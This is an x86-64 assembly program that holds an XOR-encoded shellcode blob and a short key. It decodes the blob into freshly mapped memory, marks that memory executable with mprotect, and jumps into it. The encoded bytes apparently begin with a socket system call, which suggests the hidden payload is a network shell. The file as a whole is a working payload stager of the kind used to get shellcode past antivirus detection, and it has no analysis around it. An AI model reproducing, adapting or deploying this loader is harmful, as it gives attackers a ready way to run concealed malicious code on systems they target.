; XOR-decrypt a shellcode and run it
; r12 = remaining source bytes
; r13 = current key position
; r14 = position in memory for decoded shellcode
; r15 = address of key

global _start

section .rodata
    msg:    db 0x6E, 0x21, 0x51, 0x9A, 0x6E, 0x06, 0x57, 0x63, 0x02, 0x5A, 0x0B, 0x0D, 0x41, 0x94, 0x4C, 0xBD, 0x0A, 0x09, 0x03, 0x54, 0x7B, 0x08, 0x09, 0x02, 0x55, 0x4C, 0x81, 0xEF, 0x69, 0x14, 0x5E, 0x62, 0x23, 0x5B, 0x0B, 0x01, 0x62, 0x0A, 0x5D, 0x4C, 0xFB, 0xC6, 0x63, 0x22, 0x5C, 0x0B, 0x0D, 0x7C, 0xF5, 0x6E, 0x3F, 0x50, 0x90, 0x4B, 0xBF, 0x2B, 0x6A, 0x60, 0x6D, 0x2B, 0x77, 0x60, 0x09, 0x50, 0x4C, 0x8D, 0xEF, 0x5B, 0x54, 0x4C, 0x8D, 0xEE, 0x06, 0x06
    msglen: equ $ - msg

    key:    db 0x04, 0x08, 0x09, 0x03, 0x04
    keylen: equ $ - key

section .text

_start:
    mov r12, msglen             ; Number of bytes to process
    mov r13, 0	                ; Key index = 0
    mov r14, 0			; for location in rax buffer

; Allocate memory for shellcode, make it RW
    mov     eax, 9          ; __NR_mmap 
    mov     edi, 0          ; addr = NULL
    mov     esi, 4096       ; length
    mov     edx, 3          ; PROT_READ | PROT_WRITE
    mov     r10, 0x22       ; MAP_PRIVATE | MAP_ANONYMOUS
    mov     r8, -1          ; fd = -1
    xor     r9, r9          ; offset = 0
    syscall

    mov rbx, rax	    ; point RBX to the actual memory region

    ;set source and dest
    lea rsi, [rel msg]          ; Source string
    lea r15,  [rel key]          ; Key address

copy_loop:
    cmp r12, 0
    je copy_done

    mov al, [rsi]               ; Load source byte
    xor al, [r15 + r13]         ; XOR with current key byte
    mov [rbx + r14], al         ; Store result in destination

    inc rsi                     ; Next source byte
    inc r14                     ; Next destination byte for rax
    dec r12                     ; Decrement remaining bytes

    inc r13                     ; Advance key index
    cmp r13, keylen
    jne copy_loop

    xor r13, r13                ; Reset key index
    jmp copy_loop

copy_done:

    ; Change RW -> RX using mprotect
    mov eax, 10         ; __NR_mprotect
    mov rdi, rbx        ; address of buffer for shellcode
    mov esi, 4096       ; length
    mov edx, 5          ; PROT_READ | PROT_EXEC
    syscall

    ; do the thang
    call rbx ; execute shellcode, rbx points to the memory address allocated previously

    ; deallocate the memory

    ; munmap(address, length)
    mov     eax, 11             ; sys_munmap
    mov     rdi, rbx            ; address returned by mmap
    mov     esi, 4096           ; length = 4096
    syscall
 
    ; exit
    mov rax, 60              ; exit syscall
    xor rdi, rdi             ; Exit status = 0
    syscall

